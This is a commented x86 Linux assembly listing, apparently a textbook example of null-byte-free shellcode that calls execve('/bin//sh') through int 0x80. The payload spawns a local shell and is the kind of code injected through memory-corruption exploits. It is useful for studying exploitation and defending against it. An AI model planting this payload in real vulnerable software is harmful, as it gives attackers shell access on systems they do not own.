global _start

section .text
; execve("/bin//sh", ["/bin//sh", 0x0], [0x0]);
_start:
    xor eax, eax       ; set eax to 0x0

    ; write "/bin//sh" to the stack
    push eax           ;push null bytes
    push 0x68732f2f    ;push "//sh"
    push 0x6e69622f    ;push "/bin"
    mov ebx, esp       ;ebx points to "/bin//sh"

    push eax           ;push null pointer
    push ebx           ;push address of "/bin//sh"
    mov ecx, esp       ;ecx points to ["bin//sh", 0x0]

    lea edx, [ecx+0x4] ;edx points to a null pointer

    ; execve() is sycall 11
    add al, 0x5
    add al, 0x6
    int 0x80
